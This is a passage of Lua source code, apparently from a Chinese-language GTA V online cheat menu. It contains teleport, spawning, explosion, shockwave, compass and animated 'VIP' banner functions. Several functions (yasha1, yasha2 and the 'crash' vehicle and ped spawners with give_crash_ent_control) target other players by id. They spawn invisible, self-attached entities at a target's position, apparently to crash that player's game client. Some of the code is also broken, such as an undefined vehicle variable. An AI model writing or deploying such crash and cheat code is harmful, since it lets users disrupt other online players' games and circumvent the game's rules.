            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(GetLocalPed(), pos.x, pos.y, pos.z + 1, false, false, false)
        end)
        menu.action(lis, "Drive Entity", {}, "", function()
            PED.SET_PED_INTO_VEHICLE(GetLocalPed(), handle, -1)
        end)
        menu.action(lis, "Teleport to you", {}, "", function()
            local pos = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(handle, pos.x, pos.y, pos.z + 1, false, false, false)
        end)
    end
end
--
function yasha1(pid, model, position, heading)
    STREAMING.REQUEST_MODEL(model)
    while not STREAMING.HAS_MODEL_LOADED(model) do 
        wait(25) 
    end
    local offset = {x = math.sin(math.rad(heading)) * 2, y = math.cos(math.rad(heading)) * 2, z = 3}
    local spawnPos = {x = position.x - offset.x, y = position.y - offset.y, z = position.z - offset.z}
    local khanjali = entities.create_vehicle(model, spawnPos, heading)
    if not khanjali then 
        return 
    end
    for i = 2, 4 do
        local attachPos = (i == 2) and {x = 0, y = 0, z = 3} or {x = 0, y = 0, z = 0}
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(khanjali)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(khanjali, khanjali, 0, attachPos.x, attachPos.y, attachPos.z, 0, 0, 0, 
        -180, false, true, false, false, 0, true)
    end
    ENTITY.SET_ENTITY_VISIBLE(khanjali, false)
    wait(2300)
    entities.delete_by_handle(khanjali)
end
function yasha2(pid, objectModel)
    STREAMING.REQUEST_MODEL(objectModel)
    while not STREAMING.HAS_MODEL_LOADED(objectModel) do
        wait(0)
    end
    local pos = players.get_position(pid)
    local vent_objs = {}
    for i = -1.2, 1.2, 0.2 do
        for j = -1.2, 1.2, 0.2 do
            if i ~= 0 or j ~= 0 then
                local vent = entities.create_object(objectModel, v3.new(pos.x + i, pos.y + j, pos.z - 2.4))
                if vent then
                    table.insert(vent_objs, vent)
                    ENTITY.SET_ENTITY_VISIBLE(vent, false)
                end
            end
        end
    end
    wait(275)
    for _, obj in ipairs(vent_objs) do
        entities.delete_by_handle(obj)
    end
end
function loadModels(models)
    for _, model in ipairs(models) do
        STREAMING.REQUEST_MODEL(model)
        while not STREAMING.HAS_MODEL_LOADED(model) do
            util.yield(0)
        end
    end
end
spawned_crash_vehs = {}
spawned_crash_peds = {}
function spawn_vehicle_and_ped(veh_hash, ped_hash, coords)
    local vehicle = entities.create_vehicle(veh_hash, coords, 0)
    VEHICLE.SET_VEHICLE_ON_GROUND_PROPERLY(vehicle,0)
    local ped = entities.create_ped(26, ped_hash, coords, 0)
    util.yield(25)
    PED.SET_PED_INTO_VEHICLE(ped, vehicle, -1)
        util.yield(10)
    table.insert(spawned_crash_vehs, vehicle)
    table.insert(spawned_crash_peds, ped)
end
function spawn_vehicles_and_peds(pid, num_vehicles, veh_hash, ped_hash, coords)
    for i = 1, num_vehicles do
        coords.x = coords.x + math.random(-5, 5)
        coords.y = coords.y + math.random(-5, 5)
        spawn_vehicle_and_ped(veh_hash, ped_hash, coords)
    end
end
function give_crash_ent_control(pid)
    local ped_net_id2 = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(spawned_crash_peds[2])
    local veh_net_id2 = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(spawned_crash_vehs[2])
    for i = 1, 100 do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(pid, spawned_crash_peds[2])
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(pid, spawned_crash_vehs[2])
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(spawned_crash_peds[2]) then
            NETWORK.SET_NETWORK_ID_CAN_MIGRATE(ped_net_id2, true)
        end
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(spawned_crash_vehs[2]) then
            NETWORK.SET_NETWORK_ID_CAN_MIGRATE(veh_net_id2, true)
        end
    end
end
function spawn_bad_vehicle_and_ped(veh_hash, ped_hash, coords)
    local vehicle = entities.create_vehicle(veh_hash, coords, 0)
    VEHICLE.SET_VEHICLE_ON_GROUND_PROPERLY(vehicle,0)
    VEHICLE.SET_VEHICLE_MOD_KIT(targetVehicle2, 0)
    VEHICLE.SET_VEHICLE_MOD(targetVehicle2, 34, 3, false)
    VEHICLE.TOGGLE_VEHICLE_MOD(targetVehicle2, 34, true)
    local ped = entities.create_ped(26, ped_hash, coords, 0)
    util.yield(25)
    PED.SET_PED_INTO_VEHICLE(ped, vehicle, -1)
        util.yield(10)
    table.insert(spawned_crash_vehs, vehicle)
    table.insert(spawned_crash_peds, ped)
end
function spawn_bad_vehicles_and_peds(pid, num_vehicles, veh_hash, ped_hash, coords)
    for i = 1, num_vehicles do
        coords.x = coords.x + math.random(-5, 5)
        coords.y = coords.y + math.random(-5, 5)
        spawn_bad_vehicle_and_ped(veh_hash, ped_hash, coords)
    end
end
function is_valid_ped(ped)
    return PED.IS_PED_A_PLAYER(ped) or 
	PED.IS_PED_FATALLY_INJURED(ped) or 
	PED.IS_PED_IN_ANY_VEHICLE(ped, true)
end
function pick_up_ped()
    local closest = get_closest_ped(
		ENTITY.GET_ENTITY_COORDS(players.user_ped()))
    if closest and closest[2] <= 5 then 
        local ped = closest[1]
        request_anim_dict("random@atmrobberygen")
        TASK.TASK_PLAY_ANIM(players.user_ped(), 
		"random@atmrobberygen", "b_atm_mugging", 8.0, 0.0, 
		-1, 50, 0, false, false, false)
        util.yield(500)
        ENTITY.SET_ENTITY_HEADING(ped, 
		ENTITY.GET_ENTITY_HEADING(players.user_ped()))
        ENTITY.ATTACH_ENTITY_TO_ENTITY(ped, players.user_ped(), 
		PED.GET_PED_BONE_INDEX(players.user_ped(), 28422),
		0.08, -0.1, -0.27, -45, 0, 0, false, false, false, true, 0, true)
        PED.SET_PED_CONFIG_FLAG(ped, 223, true)
		HUD.CREATE_FAKE_MP_GAMER_TAG(ped,"→捕获←",false,false,"flakin",0)
        return ped
    end 
    return nil
end
function throw_ped(ped)
    ENTITY.DETACH_ENTITY(ped)
    PED.SET_PED_TO_RAGDOLL(ped, 10, 10, 0, 
	false, false, false)
    ENTITY.SET_ENTITY_MAX_SPEED(ped, 100.0)
    ENTITY.APPLY_FORCE_TO_ENTITY(ped, 1, 0, 
	100, 0, 0, 0, 0, 0, true, false, true, false, false)
    AUDIO.PLAY_PAIN(ped, 7, 0, 0)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
    ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), true)
    ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(ped, players.user_ped(), false)
    request_anim_dict("melee@unarmed@streamed_core")
    TASK.TASK_PLAY_ANIM(players.user_ped(), 
	"melee@unarmed@streamed_core", "heavy_punch_a", 
	8.0, 8.0, -1, 0, 0.3, false, false, false)
    PED.SET_PED_CONFIG_FLAG(ped, 223, false)
    util.create_thread(function()
	local i = 1
    while i <= 1000 do
    util.yield()
    FIRE.ADD_EXPLOSION(ENTITY.GET_ENTITY_COORDS(ped).x,
    ENTITY.GET_ENTITY_COORDS(ped).y,
    ENTITY.GET_ENTITY_COORDS(ped).z-0.5, 12,1, true, false,0, true)
    i = i+1
    end
    end)
    util.yield(500)
    ENTITY.FREEZE_ENTITY_POSITION(
	players.user_ped(), false)
end
function get_forward_vector_from_heading(heading)
    local heading_rad = math.rad(heading)
    local forward_x = -math.sin(heading_rad)
    local forward_y = math.cos(heading_rad)
    return forward_x, forward_y
end
function setmenoinvisible()
    local myPed = players.user_ped()
    ENTITY.SET_ENTITY_VISIBLE(myPed, true)
end
function spawnAndCustomizeEntity(attachmentHash)
    local playerPed = players.user_ped()
    local playerPos = ENTITY.GET_ENTITY_COORDS(playerPed)
    local playerHeading = ENTITY.GET_ENTITY_HEADING(playerPed)
    local spawnPos = v3.new(playerPos.x + math.sin(math.rad(playerHeading)) * 5, playerPos.y + math.cos(math.rad(playerHeading)) * 5, playerPos.z)
    local motorcycleHash = -1216765807 
    STREAMING.REQUEST_MODEL(motorcycleHash)
    while not STREAMING.HAS_MODEL_LOADED(motorcycleHash) do
        util.yield(0) 
    end
    local motorcycle = entities.create_vehicle(motorcycleHash, spawnPos, playerHeading)
    PED.SET_PED_INTO_VEHICLE(playerPed, motorcycle, -1)
    ENTITY.SET_ENTITY_VISIBLE(motorcycle, false)
    STREAMING.REQUEST_MODEL(attachmentHash)
    while not STREAMING.HAS_MODEL_LOADED(attachmentHash) do
        util.yield(0)
    end
    local attachedEntity = entities.create_vehicle(attachmentHash, spawnPos, playerHeading)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(attachedEntity, motorcycle, 0, 0, 0, 0, 0, 0, 0, true, false, false,false, 0, true)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(motorcycleHash)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(attachmentHash)
end
spawnedObjects = {}
spawnedVehicles = {}
function deleteEntities(entitiesList)
    for _, entityID in ipairs(entitiesList) do
        entities.delete_by_handle(entityID)
    end
    return {}
end
function createAndAttachObject(objectHash, position, attachToPed)
    local obj = entities.create_object(objectHash, position)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(obj, attachToPed, 0, 0, 0, 0, 0, 0, 0, false, true, false,false, 0, true)
    return obj
end
function spawnAndDeleteVehicles(vehHash, position, count)
    STREAMING.REQUEST_MODEL(vehHash)
    while not STREAMING.HAS_MODEL_LOADED(vehHash) do
        util.yield(10) 
    end
    for i = 1, count do
        local veh = entities.create_vehicle(vehHash, position, position.z)
        table.insert(spawnedVehicles, veh)
    end
    util.yield(50) 
    spawnedVehicles = deleteEntities(spawnedVehicles)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(vehHash)
end
function weirdcombatstats(ped1, thereped)
    PED.SET_PED_COMBAT_ABILITY(ped1, 100)
    TASK.TASK_COMBAT_PED(ped1, thereped, 0, 16)
    PED.SET_PED_KEEP_TASK(ped1, true)
end
--
master_index = false
fadein = false
function dectfadein(f)
    local ctran = 0
    sx = f
    while sx do
        wait()
        util.create_thread(function ()
            GRAPHICS.DRAW_RECT(.5, .01, 1, 0.01, 255, 80, 160, ctran)
            GRAPHICS.DRAW_RECT(.5, .02, 1, 0.01, 255, 100, 160, ctran)
            GRAPHICS.DRAW_RECT(.5, .03, 1, 0.01, 255, 120, 160, ctran)
            GRAPHICS.DRAW_RECT(.5, .04, 1, 0.01, 255, 140, 160, ctran)
            GRAPHICS.DRAW_RECT(.5, .05, 1, 0.01, 255, 160, 160, ctran)
            GRAPHICS.DRAW_RECT(.5, .06, 1, 0.01, 255, 180, 160, ctran)
            GRAPHICS.DRAW_RECT(.5, .07, 1, 0.01, 255, 200, 160, ctran)
        ctran = ctran + 1
        end)
    end
end
function master1(f, masterpid)
    starttime = os.time()
    --local ctran = 0
    local rainbowr = 255
    local rainbowg = 255
    local rainbowb = 255
    tx1 = f
    while tx1 do
        util.create_thread(function ()
            dectfadein(f)
        end)
        wait()
        textX = lerp(textX, textEndPosition, speed)
        local text = "~h~~italic~GTLua Ultra VIP " .. masterpid
        rainbowr = rainbowr + math.random(0, 3)
        rainbowg = rainbowg + math.random(0, 3)
        rainbowb = rainbowb + math.random(0, 3)
        if rainbowr > 255 then
            rainbowr = rainbowr - 255
        end
        if rainbowg > 255 then
            rainbowg = rainbowg - 255
        end
        if rainbowb > 255 then
            rainbowb = rainbowb - 255
        end
        HUD.SET_TEXT_SCALE(0.5, 0.4)
        HUD.SET_TEXT_COLOUR(rainbowr, rainbowg, rainbowb, 255)
        HUD.SET_TEXT_FONT(0)
        HUD.SET_TEXT_CENTRE(1)
        HUD.SET_TEXT_OUTLINE(0)
        util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT(text)
        HUD.END_TEXT_COMMAND_DISPLAY_TEXT(textX, 0.02)
        if os.time() - starttime >= 2 then
            tx1 = false
        end
    end
end
function master2(f, masterpid)
    starttime = os.time()
    local rainbowr = 255
    local rainbowg = 255
    local rainbowb = 255
    tx2 = f
    while tx2 do
        wait()
        textX = lerp(textX, textEndPosition, speed)
        local text = "~h~~italic~GTLua Ultra VIP " .. masterpid .. " 至臻皇榜"
        rainbowr = rainbowr + math.random(0, 3)
        rainbowg = rainbowg + math.random(0, 3)
        rainbowb = rainbowb + math.random(0, 3)
        if rainbowr > 255 then
            rainbowr = rainbowr - 255
        end
        if rainbowg > 255 then
            rainbowg = rainbowg - 255
        end
        if rainbowb > 255 then
            rainbowb = rainbowb - 255
        end
        HUD.SET_TEXT_SCALE(0.5, 0.4)
        HUD.SET_TEXT_COLOUR(rainbowr, rainbowg, rainbowb, 255)
        HUD.SET_TEXT_FONT(0)
        HUD.SET_TEXT_CENTRE(1)
        HUD.SET_TEXT_OUTLINE(0)
        util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT(text)
        HUD.END_TEXT_COMMAND_DISPLAY_TEXT(textX, 0.02)
        if os.time() - starttime >= 2 then
            tx2 = false
        end
    end
end
function master3(f, masterpid)
    starttime = os.time()
    local rainbowr = 255
    local rainbowg = 255
    local rainbowb = 255
    tx3 = f
    while tx3 do
        wait()
        textX = lerp(textX, textEndPosition, speed)
        local text = "~h~~italic~GTVIP 至臻皇榜 " .. masterpid .. " 正在该战局"
        HUD.SET_TEXT_SCALE(0.5, 0.4)
        rainbowr = rainbowr + math.random(0, 3)
        rainbowg = rainbowg + math.random(0, 3)
        rainbowb = rainbowb + math.random(0, 3)
        if rainbowr > 255 then
            rainbowr = rainbowr - 255
        end
        if rainbowg > 255 then
            rainbowg = rainbowg - 255
        end
        if rainbowb > 255 then
            rainbowb = rainbowb - 255
        end
        HUD.SET_TEXT_COLOUR(rainbowr, rainbowg, rainbowb, 255)
        HUD.SET_TEXT_FONT(0)
        HUD.SET_TEXT_CENTRE(1)
        HUD.SET_TEXT_OUTLINE(0)
        util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT(text)
        HUD.END_TEXT_COMMAND_DISPLAY_TEXT(textX, 0.02)
        if os.time() - starttime >= 3 then
            tx3 = false
        end
    end
end
function master4(f, masterpid)
    starttime = os.time()
    local rainbowr = 255
    local rainbowg = 255
    local rainbowb = 255
    tx4 = f
    while tx4 do
        wait()
        textX = lerp(textX - 0.0023, textEndPosition, speed)
        local text = "~h~~italic~GRANDTOURINGVIP 至臻皇榜 " .. masterpid
        rainbowr = rainbowr + math.random(0, 3)
        rainbowg = rainbowg + math.random(0, 3)
        rainbowb = rainbowb + math.random(0, 3)
        if rainbowr > 255 then
            rainbowr = rainbowr - 255
        end
        if rainbowg > 255 then
            rainbowg = rainbowg - 255
        end
        if rainbowb > 255 then
            rainbowb = rainbowb - 255
        end
        HUD.SET_TEXT_SCALE(0.5, 0.4)
        HUD.SET_TEXT_COLOUR(rainbowr, rainbowg, rainbowb, 255)
        HUD.SET_TEXT_FONT(0)
        HUD.SET_TEXT_CENTRE(1)
        HUD.SET_TEXT_OUTLINE(0)
        util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT(text)
        HUD.END_TEXT_COMMAND_DISPLAY_TEXT(textX, 0.02)
        if os.time() - starttime >= 4 then
            tx4 = false
        end
    end
end
function master5(f, masterpid)
    starttime = os.time()
    local rainbowr = 255
    local rainbowg = 255
    local rainbowb = 255
    tx5 = f
    while tx5 do
        wait()
        textX = lerp(textX - 0.0050, textEndPosition, speed) -- 控制左滑出速度
        local text = "~h~~italic~GRANDTOURINGVIP 至臻皇榜会员 " .. masterpid
        rainbowr = rainbowr + math.random(0, 3)
        rainbowg = rainbowg + math.random(0, 3)
        rainbowb = rainbowb + math.random(0, 3)
        if rainbowr > 255 then
            rainbowr = rainbowr - 255
        end
        if rainbowg > 255 then
            rainbowg = rainbowg - 255
        end
        if rainbowb > 255 then
            rainbowb = rainbowb - 255
        end
        HUD.SET_TEXT_SCALE(0.5, 0.4)
        HUD.SET_TEXT_COLOUR(rainbowr, rainbowg, rainbowb, 255)
        HUD.SET_TEXT_FONT(0)
        HUD.SET_TEXT_CENTRE(1)
        HUD.SET_TEXT_OUTLINE(0)
        util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT(text)
        HUD.END_TEXT_COMMAND_DISPLAY_TEXT(textX, 0.02)
        if os.time() - starttime >= 3 then
            tx5 = false
        end
    end
end
function dectfadeon(f)
    local ctran = 255
    sx1 = f
    while sx1 do
        wait()
        GRAPHICS.DRAW_RECT(.5, .01, 1, 0.01, 255, 80, 160, ctran)
        GRAPHICS.DRAW_RECT(.5, .02, 1, 0.01, 255, 100, 160, ctran)
        GRAPHICS.DRAW_RECT(.5, .03, 1, 0.01, 255, 120, 160, ctran)
        GRAPHICS.DRAW_RECT(.5, .04, 1, 0.01, 255, 140, 160, ctran)
        GRAPHICS.DRAW_RECT(.5, .05, 1, 0.01, 255, 160, 160, ctran)
        GRAPHICS.DRAW_RECT(.5, .06, 1, 0.01, 255, 180, 160, ctran)
        GRAPHICS.DRAW_RECT(.5, .07, 1, 0.01, 255, 200, 160, ctran)
        if fadein then
            ctran = ctran - 4
        end
    end
end
function master6(f, masterpid)
    starttime = os.time()
    local rainbowr = 255
    local rainbowg = 255
    local rainbowb = 255
    local ctran = 255
    sx = false
    util.create_thread(function ()
        dectfadeon(f)
    end)
    tx6 = f
    while tx6 do
        wait()
        textX = lerp(textX + 0.0300, textEndPosition, speed) -- 控制左滑出速度
        local text = "~h~~italic~GRANDTOURINGVIP 至臻皇榜会员 " .. masterpid
        rainbowr = rainbowr + math.random(0, 3)
        rainbowg = rainbowg + math.random(0, 3)
        rainbowb = rainbowb + math.random(0, 3)
        if rainbowr > 255 then
            rainbowr = rainbowr - 255
        end
        if rainbowg > 255 then
            rainbowg = rainbowg - 255
        end
        if rainbowb > 255 then
            rainbowb = rainbowb - 255
        end
        HUD.SET_TEXT_SCALE(0.5, 0.4)
        HUD.SET_TEXT_COLOUR(rainbowr, rainbowg, rainbowb, 255)
        HUD.SET_TEXT_FONT(0)
        HUD.SET_TEXT_CENTRE(1)
        HUD.SET_TEXT_OUTLINE(0)
        util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT(text)
        HUD.END_TEXT_COMMAND_DISPLAY_TEXT(textX, 0.02)
        fadein = true
        if os.time() - starttime >= 3 then
            sx1 = false
            tx6 = false
            master_index = true
            textX = 0
        end
    end
end
function mastergt(f, masterpid)
    master = f
    while master do
        wait()
        master1(f, masterpid)
        master2(f, masterpid)
        master3(f, masterpid)
        master4(f, masterpid)
        master5(f, masterpid)
        master6(f, masterpid)
        if master_index then
            master = false
        end
    end
end
--
timerT = 0
function InstantKillDoordrawText(text, x, y)
    HUD.SET_TEXT_SCALE(0.5, 0.35)
    HUD.SET_TEXT_FONT(6)
    HUD.SET_TEXT_COLOUR(0, 255, 255, 255)
    HUD.SET_TEXT_CENTRE(true)
    HUD.SET_TEXT_OUTLINE(true)
    util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT(textToShow)
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.5, 0.05, 0)
end
function request_anim_dict(dict)
    request_time = os.time()
    if not STREAMING.DOES_ANIM_DICT_EXIST(dict) then
        return
    end
    STREAMING.REQUEST_ANIM_DICT(dict)
    while not STREAMING.HAS_ANIM_DICT_LOADED(dict) do
        if os.time() - request_time >= 10 then
            break
        end
        util.yield()
    end
end
function get_ped_nearby_vehicles(ped, maxVehicles)
    maxVehicles = maxVehicles or 16
    local pVehicleList = memory.alloc((maxVehicles + 1) * 8)
    memory.write_int(pVehicleList, maxVehicles)
    local vehiclesList = {}
    for i = 1, PED.GET_PED_NEARBY_VEHICLES(ped, pVehicleList) do
        vehiclesList[i] = memory.read_int(pVehicleList + i * 8)
    end
    return vehiclesList
end
function get_ped_nearby_peds(ped, maxpeds)
    maxpeds = maxpeds or 16
    local ppedsList = memory.alloc((maxpeds + 1) * 8)
    memory.write_int(ppedsList, maxpeds)
    local pedsList = {}
    for i = 1, PED.GET_PED_NEARBY_PEDS(ped, ppedsList, 1) do
        pedsList[i] = memory.read_int(ppedsList + i * 8)
    end
    return pedsList
end
function InstantKillDoortick()
	local playerPed = PLAYER.PLAYER_PED_ID()
	local playerState = PED.IS_PED_IN_ANY_VEHICLE(playerPed, false)
	if (playerState) and (modState) then
		local currentVehicle = PED.GET_VEHICLE_PED_IS_IN(playerPed, false)
		if util.is_key_down(0x25) then
			VEHICLE.SET_VEHICLE_DOOR_OPEN(currentVehicle, 0, false, false)
			VEHICLE.SET_VEHICLE_DOOR_OPEN(currentVehicle, 0, true, false)
			if (unbreakableDoor) then
				VEHICLE._SET_VEHICLE_DOOR_BREAKABLE(currentVehicle, 0, false)
			end
		end
		if util.is_key_down(0x27) then
			VEHICLE.SET_VEHICLE_DOOR_OPEN(currentVehicle, 1, false, false)
			VEHICLE.SET_VEHICLE_DOOR_OPEN(currentVehicle, 1, true, false)
			if (unbreakableDoor) then
				VEHICLE._SET_VEHICLE_DOOR_BREAKABLE(currentVehicle, 1, false)
			end
		end
	end
	if util.is_key_down(0x47) then
		modState = not modState
		if (modState) then
			textToShow = "瞬杀门启动"
			timerT = 50
		else
			textToShow = "瞬杀门关闭"
			timerT = 50
			if (unbreakableDoor) then
				VEHICLE._SET_VEHICLE_DOOR_BREAKABLE(currentVehicle, 0, true)
				VEHICLE._SET_VEHICLE_DOOR_BREAKABLE(currentVehicle, 1, true)
			end
		end
	end
	sameKeyModState = util.is_key_down(0x47)
	if (timerT > 0) then
		InstantKillDoordrawText()
		timerT = timerT - 1
	end
end
force = 100
function applyForce(playerCoord, entity)
	local coord=ENTITY.GET_ENTITY_COORDS(entity,true)
	local dx=coord.x - playerCoord.x
	local dy=coord.y - playerCoord.y
	local dz=coord.z - playerCoord.z
	local distance=math.sqrt(dx*dx+dy*dy+dz*dz)
	local distanceRate = (force / distance) * (1.04^(1 - distance))
	ENTITY.APPLY_FORCE_TO_ENTITY(entity, 1, 
	distanceRate*dx,distanceRate*dy,distanceRate*dz, 
	math.random()*math.random(-1,1),math.random()*math.random(-1,1),
	math.random()*math.random(-1,1), true, false, true, true, true, true)
end
function shockwavetick()
    local mypid = players.user_ped()
	STREAMING.REQUEST_ANIM_DICT("anim@mp_player_intcelebrationmale@thumbs_up")
	while (not STREAMING.HAS_ANIM_DICT_LOADED(
		"anim@mp_player_intcelebrationmale@thumbs_up")) 
		do util.yield(50) end
    TASK.TASK_PLAY_ANIM(mypid, "anim@mp_player_intcelebrationmale@thumbs_up",
	"thumbs_up",10.0, -2.0, -1, 52, 0, true, true, false)
    util.yield(1600)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped(), true)
end
keyPressed = false
function shockwavetick2()
	if util.is_key_down(0x45) then
		keyPressed = true
	elseif keyPressed then
		keyPressed = false
		shockwavetick()
		local player = players.user_ped()
		local playerCoord = ENTITY.GET_ENTITY_COORDS(player,true)		
		local Table,Count = get_ped_nearby_vehicles(player)
		local playerVehicle = PLAYER.GET_PLAYERS_LAST_VEHICLE()
		local inVehicle = PED.IS_PED_IN_VEHICLE(player,playerVehicle,true)
		for k,v in ipairs(Table) do
			if(not inVehicle or playerVehicle ~= v) then
				applyForce(playerCoord, v)
			end
		end
		Tables,Count = get_ped_nearby_peds(player)
		for k,v in ipairs(Tables) do
			PED.SET_PED_RAGDOLL_ON_COLLISION(v,true)
			PED.SET_PED_RAGDOLL_FORCE_FALL(v)
			applyForce(playerCoord, v)
		end
	end
end
function get_closest_ped_index(coords)
    local closest = 0
    local closest_dist = 1000000
    local this_dist = 0
    for _, ped in pairs(entities.get_all_peds_as_handles()) do 
        this_dist = v3.distance(coords, ENTITY.GET_ENTITY_COORDS(ped))
        if this_dist < closest_dist and not PED.IS_PED_A_PLAYER(ped) 
		and not PED.IS_PED_FATALLY_INJURED(ped)  and
		not PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
            closest = ped
            closest_dist = this_dist
        end
    end
    if closest ~= nil then 
        return {closest, closest_dist}
    else
        return nil 
    end
end
--
function agu_parkour2()
	if(util.is_key_down(0x4A))then -- J
		PLAYER.GIVE_PLAYER_RAGDOLL_CONTROL(players.user_ped(), true);
		for i = 1, 5 do
			ENTITY.APPLY_FORCE_TO_ENTITY(players.user_ped(), 1, 0,0,2.3, 0,0,0, false, false, false, false, false, false);
		end
		ENTITY.SET_ENTITY_INVINCIBLE(players.user_ped(), true);
		PED.SET_PED_TO_RAGDOLL(players.user_ped(), 1, 1, 1, true, true, true);
	else
		ENTITY.SET_ENTITY_INVINCIBLE(players.user_ped(), false);
	end
end
local last_coords = v3(0, 0, 0)
function is_move()--检测玩家移动
    local player_ped = players.user_ped()
    local current_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
    local ba = {
        x = current_coords.x - last_coords.x,
        y = current_coords.y - last_coords.y,
        z = current_coords.z - last_coords.z
    }
    local distance = math.sqrt(ba.x * ba.x + ba.y * ba.y + ba.z * ba.z)
    if distance >= 0.5 then
        last_coords = current_coords
        return true
    else
        return false
    end
end
function SwPoser(ObjHash)--推牌九
    local hash = ObjHash
    request_model_load(ObjHash)
    local last_ent = players.user_ped()
    local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(last_ent, 0, -1, 0)
    local d = entities.create_object(ObjHash, c)
    ENTITY.SET_ENTITY_HEADING(d, ENTITY.GET_ENTITY_HEADING(last_ent))
    OBJECT.PLACE_OBJECT_ON_GROUND_PROPERLY(d)
end
function DropWeapon()--丢弃武器
    if WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) ~= util.joaat("WEAPON_UNARMED") then
        if PAD.IS_CONTROL_JUST_RELEASED(38, 38) then
            if WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) == util.joaat("WEAPON_BZGAS") or 
               WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) == util.joaat("WEAPON_FIREEXTINGUISHER") or 
               WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) == util.joaat("WEAPON_SNOWBALL") then
                WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(), WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()))
            else
                WEAPON.SET_PED_DROPS_INVENTORY_WEAPON(players.user_ped(), WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()), 0, 1.0, 0.0, 0)
            end
        end
    end
end
function compassdrawText(text, x, y, scale)
    HUD.SET_TEXT_FONT(0)
    HUD.SET_TEXT_SCALE(scale, scale)
    HUD.SET_TEXT_COLOUR(255, 100, 0, 210)
    HUD.SET_TEXT_WRAP(0.0, 1.0)
    HUD.SET_TEXT_CENTRE(true)
    HUD.SET_TEXT_DROPSHADOW(2, 2, 0, 0, 0)
    HUD.SET_TEXT_EDGE(1, 0, 0, 0, 205)
    HUD.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("STRING")
    HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(text)
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(y, x)
end
function get_entity_heading(ent)--获取方向
    native_invoker.begin_call()
        native_invoker.push_arg_int(ent)
        native_invoker.end_call_2(0xE83D4F9BA2A38914)
    return native_invoker.get_return_value_float()
end
function compasstick()--指南针
    local pxDegree = 0.06 / 180
    local playerHeadingDegrees = 360.0 - get_entity_heading(players.user_ped())
    local tickDegree = playerHeadingDegrees - 180 / 2
    local tickDegreeRemainder = 9.0 - (tickDegree % 9.0)
    local tickPosition = 0.18 + 0.005 + tickDegreeRemainder * pxDegree
    local dgr = tickDegree % 360.0
        tickDegree = tickDegree + tickDegreeRemainder
        while tickPosition < 0.48 + 0.3325 do
            if (tickDegree % 90.0) == 0 then
                directx.draw_rect(tickPosition, 0.04, 0.0005, 0.012, 0, 0, 0, 1)
            if dgr >= 7 and dgr <= 89  then 
                compassdrawText("东南", 0.04+0.015, tickPosition, 0.2 )
            elseif dgr >= 98 and dgr <= 179 then 
                compassdrawText("西南", 0.04+0.015, tickPosition, 0.2 )
            elseif dgr >= 187 and dgr <= 269 then 
		        compassdrawText("西北", 0.04+0.015, tickPosition, 0.2 )
            elseif ( dgr >= 278 and dgr <= 359 ) or dgr >= 315 then 
		        compassdrawText("东北", 0.04+0.015, tickPosition, 0.2 ) 
		    end
            elseif (tickDegree % 45.0) == 0 then
                directx.draw_rect(tickPosition, 0.04, 0.0005, 0.006, 0, 0, 0, 1)
            if dgr >= 225 and dgr <= 314  then 
				compassdrawText("北", 0.04+0.015, tickPosition, 0.25 )
            elseif dgr >= 135 and dgr <= 224 then 
                compassdrawText("西", 0.04+0.015, tickPosition, 0.25 )
            elseif dgr >= 45 and dgr <= 134 then 
                compassdrawText("南", 0.04+0.015, tickPosition, 0.25 )
            elseif ( dgr >= 0 and dgr <= 44 ) or dgr >= 315 then 
                compassdrawText("东", 0.04+0.015, tickPosition, 0.25 ) 
            end
            elseif (tickDegree % 90.0) == 81.0 or (tickDegree % 90.0) == 72.0
                or (tickDegree % 90.0) == 9.0 or (tickDegree % 90.0) == 18.0 then
                directx.draw_rect(tickPosition, 0.04, 0.0006, 0.003, 0, 0, 0, 1)
                end	
            tickDegree = tickDegree + 9.0
        tickPosition = tickPosition + pxDegree * 9.0
    end
end
function paotai(pt) -- 个人炮台
    isOnPed = pt
    model_hash = 0x61D4C771
    local playerCoords = players.get_position(players.user())
    if isOnPed then
        STREAMING.REQUEST_MODEL(model_hash)
        while not STREAMING.HAS_MODEL_LOADED(model_hash) do
            wait(50)
        end
        closestPed = PED.CREATE_PED(26, model_hash, playerCoords.x, playerCoords.y, playerCoords.z, 0, true, true)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(closestPed, 1119849093, 99000, false)
